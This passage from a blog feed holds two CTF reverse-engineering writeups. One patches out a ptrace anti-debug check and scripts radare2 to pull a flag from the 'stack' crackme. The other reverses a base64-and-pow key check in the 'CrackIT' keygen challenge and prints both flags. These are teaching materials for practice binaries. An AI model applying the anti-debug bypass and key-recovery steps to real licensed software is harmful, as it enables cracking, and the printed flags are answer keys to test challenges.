      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/utc-teaser/banner.png" title="banner" class="gallery-item"><img src="/img/utc-teaser/banner.png" alt="banner"></a></p><p><a href="/img/utc-teaser/banner.png" class="gallery-item"><img src="/img/utc-teaser/banner.png"></a>  </p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>So Here I’m, finally writing after 2 months :)<br>I’ve been a bit busy in October and November and I did participate in 2 onsite CTF competetitions.  </p><ul><li><a href="https://csaw.engineering.nyu.edu/ctf" target="_blank">CSAW ‘19 CTF Finals</a></li><li><a href="https://www.dsci.in/content/hackathon-2019" target="_blank">DSCI ‘19 Hackathon Finals</a></li></ul><p>We didn’t win but had an awesome experience and made new friends.<br>But most of the time in November I was studying for my mid sem. :(  </p><p>Also my Team Dc1ph3R is organizing an international 20 hr Online Jeopardy Style CTF for the first time and so obviously I spent some time creating challenges for it too.<br>Its named as Inferno CTF and we’ll be giving away pentesterlab pro sub to the winners.<br>More details about it <a href="https://ctftime.org/event/951"  target="_blank">here</a>.<br>Go check it out!!   </p><p>I participated in many other CTFs in this period but I didn’t solve any challenge which was interesting and also worth sharing with you guys.  </p><hr><h2 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR;"></a>TLDR;</h2><p>Me and my friend participated in UTC-CTF ‘19 Teaser and secured the 10th rank. This post will be a detailed writeup depicting my method of solving the problem <em>stack</em> from Reversing category. FYI I did not solve it during the CTF. This crackme is a perfect example of how one can use a debugger script to automate tedious tasks. The crackme is stripped and has ptrace as an anti-debug check. We input a flag and it is being checked using some mathematical operations such as xor. Here I have used radare’s r2pipe to write a python script. </p><h1 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h1><p><a href="/img/utc-teaser/stackthumb.png" class="gallery-item"><img src="/img/utc-teaser/stackthumb.png"></a>  </p><blockquote><p>Download <a href="/files/utc-teaser/stack"  target="_blank">stack</a>  </p></blockquote><hr><h1 id="Initial-Analysis"><a href="#Initial-Analysis" class="headerlink" title="Initial Analysis"></a>Initial Analysis</h1><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure><p>Ahh the binary is stripped :(  </p><p>Lets run it.  </p><p><a href="/img/utc-teaser/samplerun.png" class="gallery-item"><img src="/img/utc-teaser/samplerun.png"></a>  </p><p>Lets take a look at what gdb has to offer..  </p><p><a href="/img/utc-teaser/gdb1.png" class="gallery-item"><img src="/img/utc-teaser/gdb1.png"></a>  </p><p>Ohh wait, Obviously we know that we’ll not get any symbols but the binary is not even running so there might be an anti-debug check.<br>A quick check with strace reveals the ptrace call.  </p><p><a href="/img/utc-teaser/strace.png" class="gallery-item"><img src="/img/utc-teaser/strace.png"></a>  </p><p>Ptrace detected!!  </p><p>So yeah it’ll be easy for us if we patch the ptrace call in order to explore further.<br>I then moved over to IDA.<br><strong>PS:</strong> I’m using IDAv7.4 Demo<br>Switch to the Text View to get some info.<br>I found the location of ptrace syscall as IDA identifies it.  </p><p><a href="/img/utc-teaser/ptrace.png" class="gallery-item"><img src="/img/utc-teaser/ptrace.png"></a>  </p><p><strong>RBX</strong> Register is being compared after the call as follows:  </p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x40111F</span>  <span class="keyword">syscall</span>   <span class="comment">; LINUX - sys_ptrace</span></span><br><span class="line"><span class="number">0x401121</span>  <span class="keyword">mov</span>       <span class="built_in">rbx</span>, <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="number">0x401128</span>  <span class="keyword">cmp</span>       <span class="built_in">rax</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x40112B</span>  <span class="keyword">jnz</span>       short loc_40112F</span><br><span class="line"><span class="number">0x40112D</span>  <span class="keyword">jmp</span>       short loc_4010EF <span class="comment">; exit()</span></span><br></pre></td></tr></table></figure><p>We can successfully bypass the ptrace anti-debug check by replacing the following instruction with a NOP, so that cmp does not return 0 as both <strong>RAX</strong>, <strong>RBX</strong> will remain 0 and condition will be True.  </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:000401121    mov rbx, 0FFFFFFFFFFFFFFFFh</span><br></pre></td></tr></table></figure><p>I tried out Ghidra for patching too but idk why it doesn’t work for me and I get a segfault for every exported binary.<br>If someone found a workaround to fix it, please lmk in the comments. </p><p>Finally I patched the binary with pwntools.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">elf.asm(<span class="number">0x401121</span>,<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">elf.save(<span class="string">&#x27;./stack_patched&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="In-Depth-Debugging-based-Analysis"><a href="#In-Depth-Debugging-based-Analysis" class="headerlink" title="In-Depth Debugging based Analysis"></a>In-Depth Debugging based Analysis</h1><p>Now we can easily load our patched binary in GDB.<br>It’ll be easy to follow along if you have GDB-Peda installed.  </p><p>run the binary in gdb and press CTRL+C when it asks for input.<br>and then step over and now enter a fake flag.<br>So now, <strong>RAX</strong> contains 0xa ie. len of our input including the null char.  </p><p><a href="/img/utc-teaser/gdb2.png" class="gallery-item"><img src="/img/utc-teaser/gdb2.png"></a>    </p><p>After stepping over some more instructions you’ll notice that our fake flag’s first character ie. <strong>‘u’</strong> hex value (0x75) has been moved into <strong>RBX</strong>‘s higher half ie. <strong>BH</strong> register<br>Here we have 32 bit registers so they are as follows:  </p><p><a href="/img/utc-teaser/register1.jpg" class="gallery-item"><img src="/img/utc-teaser/register1.jpg"></a>   </p><p>More about them <a href="https://www.tutorialspoint.com/assembly_programming/assembly_registers.htm"  target="_blank">here</a>.  </p><p>We also observe some hexdata in <strong>RSI</strong> which is being referenced from just below the Incorrect text.<br>This remains same for any input though.   </p><p><a href="/img/utc-teaser/data.png" class="gallery-item"><img src="/img/utc-teaser/data.png"></a>    </p><p>So the first byte from this data offset ie. 0x4f will move into <strong>AH</strong> (<strong>RAX</strong>‘s higher half)<br>The algorithm is depicted by the following assembly code.<br><a href="/img/utc-teaser/algo1.png" class="gallery-item"><img src="/img/utc-teaser/algo1.png"></a>    </p><p>At last it is xoring <strong>BH</strong> and <strong>DH</strong>, then storing the result in <strong>BH</strong>. But how do we get <strong>DH</strong> register value.. that’s the whole point here.<br>As <strong>ECX</strong> is mostly used as a counter register it is changing values everytime and also its value is dependent on <strong>R10</strong> at some point ie. in <strong>sub_401132</strong>.  </p><p><a href="/img/utc-teaser/algo4.png" class="gallery-item"><img src="/img/utc-teaser/algo4.png"></a>   </p><p>Moving further, <strong>BH</strong> and <strong>AH</strong> are subtracted.  </p><p><a href="/img/utc-teaser/algo2.png" class="gallery-item"><img src="/img/utc-teaser/algo2.png"></a>    </p><p>And if result comes out to be 0 then it is fine else it’ll exit which is stated by assembly code at <strong>loc_4010CC</strong>.  </p><p><a href="/img/utc-teaser/algo3.png" class="gallery-item"><img src="/img/utc-teaser/algo3.png"></a>   </p><p>So if we know <strong>AH</strong> and <strong>DH</strong> values, we can xor them and get characters for our flag but <strong>DH</strong> is not easy to find.  </p><p>Keep on stepping and notice the values of the register especially <strong>RCX</strong> as <strong>DH</strong> is dependent on it.<br>I made some notes and this was how it iterates over our input flag.</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-------0-------</span><br><span class="line">RCX: 0x4020f0 --&gt; 0x3a (&#x27;:&#x27;) (for flag[0])</span><br><span class="line">RDX: 0x403a32 (DH=0x3a)</span><br><span class="line">AH =  0x4f</span><br><span class="line">Check if (flag[0] ^ DH == AH)</span><br><span class="line">RCX: hex(0x4020f0 + 8*4)</span><br><span class="line">R10: value at RCX</span><br><span class="line">RCX += R10</span><br><span class="line"></span><br><span class="line">So flag[0] = chr( AH ^ DH)</span><br><span class="line">           = chr(0x4f ^0x3a)</span><br><span class="line">           = &#x27;u&#x27;</span><br><span class="line">-------1-------</span><br><span class="line">RCX: 0x40215f --&gt; 0x16 (for flag[1])</span><br><span class="line">RDX: 0x401632 (DH=0x16)</span><br><span class="line">AH = 0x62</span><br><span class="line">Check if (flag[1] ^ DH == AH)</span><br><span class="line">RCX += hex( 0x40215f + 8*4)</span><br><span class="line">R10: value at RCX</span><br><span class="line">RCX += R10</span><br><span class="line"></span><br><span class="line">So flag[1] = chr( AH ^ DH)</span><br><span class="line">           = chr(0x62 ^0x16)</span><br><span class="line">           = &#x27;t&#x27;</span><br></pre></td></tr></table></figure><p>But as the no. of solves kept increasing, I decided to ditch this tedious approach (or maybe it was wrong here) and thought of automating the debugging process to get <strong>DH</strong> value.</p><h1 id="Automation-with-r2pipe"><a href="#Automation-with-r2pipe" class="headerlink" title="Automation with r2pipe"></a>Automation with r2pipe</h1><p>I chose radare r2pipe to write a short python script which sets a breakpoint just after xoring <strong>BH</strong> &amp; <strong>DH</strong>.<br>With this method I was able to get AH and DH value and at the same time I used a little trick which helped me not to provide stdin everytime it fails.</p><p>Here I set BH = AH, after I get AH value in each iteration and the subtraction returns 0 everytime. Therefore, there is no case of failure :)</p><p>Resources: <a href="https://r2wiki.readthedocs.io/en/latest/home/radare2-python-scripting/"  target="_blank">r2pipe docs</a>  </p><p><strong>PS:</strong> Create a file named <em>“stack_patched.rr2”</em> which is just used to assist in not breaking the script when it asks for input.  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/rarun2</span></span><br><span class="line">program=./stack_patched</span><br><span class="line">stdin=<span class="string">&quot;&quot;</span></span><br><span class="line">stdout=</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> r2pipe</span><br><span class="line">r = r2pipe.<span class="built_in">open</span>(<span class="string">&#x27;stack_patched&#x27;</span>,flags=[<span class="string">&#x27;-2&#x27;</span>])</span><br><span class="line">bp = <span class="number">0x40103a</span>   <span class="comment"># after &quot;xor bh, dh&quot;</span></span><br><span class="line">r.cmd(<span class="string">&#x27;e dbg.profile=stack_patched.rr2&#x27;</span>)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">r.cmd(<span class="string">&#x27;doo&#x27;</span>)</span><br><span class="line">r.cmd(<span class="string">&#x27;db &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(bp))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>):</span><br><span class="line">  r.cmd(<span class="string">&#x27;dc&#x27;</span>)</span><br><span class="line">  ah = r.cmd(<span class="string">&#x27;dr ah&#x27;</span>)</span><br><span class="line">  dh = r.cmd(<span class="string">&#x27;dr dh&#x27;</span>)</span><br><span class="line">  next_char = <span class="built_in">chr</span>(<span class="built_in">int</span>(ah,<span class="number">16</span>)^<span class="built_in">int</span>(dh,<span class="number">16</span>))</span><br><span class="line">  flag += next_char</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&#x27;[&#123;&#125;] &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i,flag)</span><br><span class="line">  r.cmd(<span class="string">&#x27;dr bh=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ah))</span><br></pre></td></tr></table></figure><p>This script yeilds our flag!!</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utc&#123;stAcks_Ar3_WACK!!!_HEHEXDXD&#125;</span><br></pre></td></tr></table></figure><p>And B00mYa we earned it !! </p><a href="https://media.giphy.com/media/g7X5T9PuUBAzu/giphy.gif" title="drawing" class="gallery-item"><img src="https://media.giphy.com/media/g7X5T9PuUBAzu/giphy.gif" alt="drawing" width="300"/></a>  <p>Also the challenge source was disclosed by the admins on github.  </p><blockquote><p>Github Source <a href="https://github.com/utcoalition/utcctf-19/tree/master/rev-stacks"  target="_blank">rev-stacks</a></p></blockquote><p>See yall in next writeup</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/CTF-Writeups/">CTF Writeups</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/reversing/">reversing</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/utc/">utc</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/radare/">radare</category>
      
      
      <comments>https://mrt4ntr4.github.io/UTC-Teaser-Stacks/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Cryptix CTF&#39;19 CrackIT</title>
      <link>https://mrt4ntr4.github.io/Cryptix-CTF-Crackit/</link>
      <guid>https://mrt4ntr4.github.io/Cryptix-CTF-Crackit/</guid>
      <pubDate>Sun, 13 Oct 2019 07:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/cryptix/banner.png" title="banner" class="gallery-item"><img src="/img/cryptix/banner.png" alt="banner"></a></p><p>So to begin with, this was one of my well spent weekend as CTFs were lined up one after the another, and fortunately some of my team members were active. There were a variety of CTFs to choose from such as, HITCON Quals, Rooters, Cryptrix, etc I just had a taste of each of them.<br>Also I’m not that much of a pro so didn’t focus too much on HITCON.<br>Difficulty level of CTFs according to me could be arranged in the following manner : </p><blockquote><p>HITCON Quals &gt; Rooters &gt; Hack-A-Bit &gt; Cryptrix &gt; Syskron  </p></blockquote><p>I didn’t like Syskron personally because It was full of guessing challenges.  </p><p>I thought maybe post about my experience regarding all of them and maybe if possible a writeup too!!<br>So I’ve been practicing level2/3 crackmes on <a href="https://crackmes.one"  target="_blank">crackmes.one</a> lately and I was excited to test my skills.<br>Out of them only Cryptix and Rooters had some reversing challenges which I was able to solve.<br>But In this blog post I’m particularly interested in solving a crackme from Cryptix known as CrackIT.<br>PS I was not able to solve it during the CTF, there were many reasons for that.. one of them being that Hack-A-Bit was also live at that same time and we were doing great in it. (We ended #1 in Hack-A-Bit XD)</p><p>And yeah here’s a backup for y’all so u can follow along! </p><blockquote><p>Download <a href="/files/cryptix/keygen"  target="_blank">keygen</a></p></blockquote><p>The name should’ve been keygenme according to me. IDK what did the author thought while naming it LOL<br>Well leaving that aside, we run the binary file and also check that it is 64 bit binary which is not stripped so we are lucky till now.  </p><p>Well In this writeup I’ll try to as detailed as possible, So plz ignore if I’m emphasizing more on any particular topic.  </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└──╼ $./keygen</span><br><span class="line">Usage: ./keygen &lt;KEY&gt;</span><br><span class="line"></span><br><span class="line">└──╼ $./keygen 12345</span><br><span class="line">Sorry no flag for you</span><br></pre></td></tr></table></figure><p>I’ve been using Ghidra decompilation feature and I have to say that it has lived upto my expections almost everytime.  </p><p>So I look over the code and found that there are 2 functions which do the actual work ie. <strong>validate_key()</strong> and <strong>Do_Something()</strong>.<br>The main function doesn’t do anything actaully, it is solely dependent on the return value of <strong>validate_key()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">validate_key</span><span class="params">(<span class="keyword">char</span> *pcParm1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> sVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  <span class="keyword">long</span> lVar3;</span><br><span class="line">  <span class="keyword">double</span> dVar4;</span><br><span class="line">  <span class="keyword">int</span> local_20;</span><br><span class="line">  </span><br><span class="line">  sVar1 = <span class="built_in">strlen</span>(pcParm1);</span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">int</span>)sVar1 == <span class="number">0x11</span>) &#123;</span><br><span class="line">    lVar3 = Does_Something(pcParm1,<span class="number">0x11</span>);</span><br><span class="line">    local_20 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (local_20 &lt; <span class="number">0x18</span>) &#123;</span><br><span class="line">      dVar4 = <span class="built_in">pow</span>(<span class="number">2.00000000</span>,(<span class="keyword">double</span>)(<span class="keyword">int</span>)*(<span class="keyword">char</span> *)(lVar3 + (<span class="keyword">long</span>)local_20));</span><br><span class="line">      <span class="keyword">if</span>(*(<span class="keyword">double</span> *)(_Zproc_libc_fini + (<span class="keyword">long</span>)local_20 * <span class="number">8</span>) != dVar4) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Sorry no flag for you&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      local_20 = local_20 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    uVar2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Sorry no flag for you&quot;</span>);</span><br><span class="line">    uVar2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Get <a href="/files/cryptix/ghidra_source.c"  target="_blank">ghidra_source.c</a><br>So <strong>validate_key()</strong> checks if our input is 0x11(17<sub>10</sub>) chars long or not. and later passes our input and its length to the <strong>DoSomething()</strong> function. We see that the return value of <strong>DoSomething()</strong> will always be a 0x18(24<sub>10</sub>) char string and then their is a power operation with base as 2 on it’s each value whose result is being compared with a variable in memory, <strong>_Zproc_libc_fini</strong>. So I checked its content.  </p><p><a href="/img/cryptix/0.png" class="gallery-item"><img src="/img/cryptix/0.png"></a>  </p><p>But It didn’t make any sense to me and also I was missing the most crucial part ie. what does <strong>DoSomething()</strong> do?<br>So I headed over to GDB and started debugging it.   </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disas validate_key</span><br></pre></td></tr></table></figure><p><a href="/img/cryptix/1.png" class="gallery-item"><img src="/img/cryptix/1.png"></a>  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *validate_key+72 </span><br><span class="line">r aaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p>We’ve set up a breakpoint just after the call to <strong>DoSomething()</strong> so that we can check the value it returns.<br>Now if we run it using a random 17 char string and we can see that the string returned from <strong>DoSomething()</strong> is stored in <strong>$eax</strong> and is simply base64 of our input. Oh great its just a base64 implementation function in C.  </p><p><a href="/img/cryptix/3.png" class="gallery-item"><img src="/img/cryptix/3.png"></a>   </p><p>Now I set up another breakpoint on the <em>ucomisd</em> instruction which is a just like compare but is specifically used for doubles. You can read more about it from <a href="https://www.felixcloutier.com/x86/ucomisd"  target="_blank">here</a>. And we simply continue the execution.  </p><p><a href="/img/cryptix/2.png" class="gallery-item"><img src="/img/cryptix/2.png"></a>    </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *validate_key+167 </span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>Now lets see what is being compared… Ohh here we see that registers with double-precision are used. This was something new to me.<br><a href="https://en.wikibooks.org/wiki/X86_Assembly/SSE"  target="_blank">Reference</a>  </p><p>So register xmm0 now stores the value to which our b64 encrypted input char is being compared to.  </p><p><a href="/img/cryptix/4.png" class="gallery-item"><img src="/img/cryptix/4.png"></a>   </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="variable">$xmm0</span></span><br></pre></td></tr></table></figure><p><a href="/img/cryptix/5.png" class="gallery-item"><img src="/img/cryptix/5.png"></a>   </p><p>Ok so the double value looks like what we want. So I tried this short script to check if I am in the right direction.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">chr</span>(x),<span class="built_in">pow</span>(<span class="number">2</span>,x)</span><br></pre></td></tr></table></figure><p>And to my surprise there was a <strong>result = 1.2676506002282294e+30</strong> for character <strong>‘d’</strong>.</p><p>Now I didn’t had more time to complete it as I told earlier.<br>But I afterwards when I continued with the ghidra’s source, here is what I deduced in python: </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">encoded = Does_Something(myinput,<span class="number">0x11</span>)</span><br><span class="line"><span class="keyword">while</span> (i &lt; <span class="number">0x18</span>):</span><br><span class="line">  res = <span class="built_in">pow</span>(<span class="number">2</span>,encoded[i])</span><br><span class="line">  <span class="keyword">if</span> (Zproc_libc_fini[i]) != res):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Sorry no flag for you&quot;</span></span><br></pre></td></tr></table></figure><p>So there will always be 0x18(24<sub>10</sub>) iterations on the encoded string because when a 17 char is base64 encoded it results in a string of length 24 everytime. And obviously if our encoded input is 24 char long the <em>Zproc_libc_fini</em> array should be of the same length.   </p><p>But as I showed you I was not able to see any values as <em>1.2676506002282294e+30</em> in ghidra so I did it in gdb.<br>I repeated the previous process, ie. set 2 breakpoints and continued their execution and when it stopped at <strong>validate_key+167</strong>, I tried to get all the values stored in <em>_Zproc_libc_fini</em>. I was having a hard time doing this. Then I learnt some more things about how to examine doubles in memory. Also <a href="https://stackoverflow.com/questions/29821669/gdb-examine-long-double-array"  target="_blank">this</a> question on stackoverflow helped a lot.    </p><p>Now If we want to get the first value in the array we can try this :   </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> (double)_Zproc_libc_fini</span><br></pre></td></tr></table></figure><p>For examining it in memory you can use:   </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/25gf &amp;_Zproc_libc_fini</span><br></pre></td></tr></table></figure><p>where g = Giant words (8 bytes)<br>and   f = floating value<br><a href="https://sourceware.org/gdb/onlinedocs/gdb/Memory.html"  target="_blank">Reference</a>  </p><p><a href="/img/cryptix/6.png" class="gallery-item"><img src="/img/cryptix/6.png"></a>   </p><p>But the most appropriate way here would be this.  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> *(double*)(&amp;_Zproc_libc_fini)@24</span><br></pre></td></tr></table></figure><p>We can get the address of <strong>_Zproc_libc_fini</strong> in memory using &amp; operator and specify the length of values we need ie. 24 using @ symbol after the address.<br><a href="https://sourceware.org/gdb/onlinedocs/gdb/Arrays.html#Arrays"  target="_blank">Reference</a>  </p><p><a href="/img/cryptix/7.png" class="gallery-item"><img src="/img/cryptix/7.png"></a>   </p><p>So its time to write a script to reverse the process of pow() using log() to get the base64 encoded key</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"></span><br><span class="line">Zproc_libc_fini =[<span class="number">1.2676506002282294e+30</span>, <span class="number">5.3169119831396635e+36</span>, <span class="number">1.5111572745182865e+23</span>, <span class="number">281474976710656</span>, </span><br><span class="line">  <span class="number">1.5845632502852868e+29</span>, <span class="number">562949953421312</span>, <span class="number">1.4411518807585587e+17</span>, <span class="number">5.3169119831396635e+36</span>, </span><br><span class="line">  <span class="number">1.5111572745182865e+23</span>, <span class="number">1125899906842624</span>, <span class="number">3.0223145490365729e+23</span>, <span class="number">562949953421312</span>, </span><br><span class="line">  <span class="number">6.338253001141147e+29</span>, <span class="number">8.1129638414606682e+31</span>, <span class="number">1.1805916207174113e+21</span>, <span class="number">281474976710656</span>, </span><br><span class="line">  <span class="number">2.5353012004564588e+30</span>, <span class="number">7.7371252455336267e+25</span>, <span class="number">1.4411518807585587e+17</span>, <span class="number">4.1538374868278621e+34</span>, </span><br><span class="line">  <span class="number">1.5111572745182865e+23</span>, <span class="number">2.3611832414348226e+21</span>, <span class="number">6.6461399789245794e+35</span>, <span class="number">2.305843009213694e+18</span>]</span><br><span class="line"></span><br><span class="line">b64encoded_str = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> Zproc_libc_fini:</span><br><span class="line">  b64encoded_str += <span class="built_in">chr</span>(<span class="built_in">int</span>((log(item)/log(<span class="number">2</span>))))</span><br><span class="line"></span><br><span class="line">flag = b64decode(b64encoded_str)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><p>By the way, we can also brute force the base64 encoded key and get it easily using the code below : </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> Zproc_libc_fini:</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">pow</span>(<span class="number">2</span>,x)==item):</span><br><span class="line">      b64encoded_str += <span class="built_in">chr</span>(x)</span><br></pre></td></tr></table></figure><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└──╼ $./keygen w34k_s3cur1ty_l0l</span><br><span class="line">Congratulations!! here is you flag: flag&#123;w34k_s3cur1ty_l0l&#125;</span><br></pre></td></tr></table></figure><a href="https://media.giphy.com/media/lN8sg2KcDNrNqzs2cZ/giphy.gif" title="drawing" class="gallery-item"><img src="https://media.giphy.com/media/lN8sg2KcDNrNqzs2cZ/giphy.gif" alt="drawing" width="300"/></a><p>Also I got to know that we can change the values of <strong>Zproc_libc_fini</strong> to represent it in doubles.  